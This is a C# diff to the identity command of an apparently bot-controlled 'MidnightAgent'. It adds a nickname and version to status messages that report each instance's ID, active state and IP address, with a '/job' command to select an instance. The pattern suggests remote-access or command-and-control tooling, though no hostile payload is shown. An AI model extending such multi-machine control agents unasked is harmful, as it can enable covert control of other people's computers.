@@ -16,8 +16,12 @@ namespace MidnightAgent.Features
             if (args.Length == 0)
             {
                 string status = AgentState.IsActiveTarget ? "✅ ACTIVE" : "zzz STANDBY";
+                string nick = NickFeature.GetNickname();
+                string display = string.IsNullOrEmpty(nick) ? AgentState.InstanceId : $"{AgentState.InstanceId} ({nick})";
+
                 string msg = $"🆔 <b>Agent Identity</b>\n\n" +
-                             $"ID: <code>{AgentState.InstanceId}</code>\n" +
+                             $"ID: <code>{display}</code>\n" +
+                             $"Ver: {Config.FullVersion}\n" +
                              $"Status: {status}\n\n" +
                              $"To select me: <code>/job {AgentState.InstanceId}</code>";
                 return Task.FromResult(FeatureResult.Ok(msg));
@@ -37,7 +41,10 @@ namespace MidnightAgent.Features
                 } catch {}
                 
                 string activeIcon = AgentState.IsActiveTarget ? "✅" : "zzz";
-                return Task.FromResult(FeatureResult.Ok($"{activeIcon} <b>{AgentState.InstanceId}</b>\n🌐 {ip}"));
+                string nick = NickFeature.GetNickname();
+                string display = string.IsNullOrEmpty(nick) ? AgentState.InstanceId : $"{AgentState.InstanceId} ({nick})";
+                
+                return Task.FromResult(FeatureResult.Ok($"{activeIcon} <b>{display}</b>\nv{Config.FullVersion}\n🌐 {ip}"));
             }
 
             // Case 3: Selection Logic
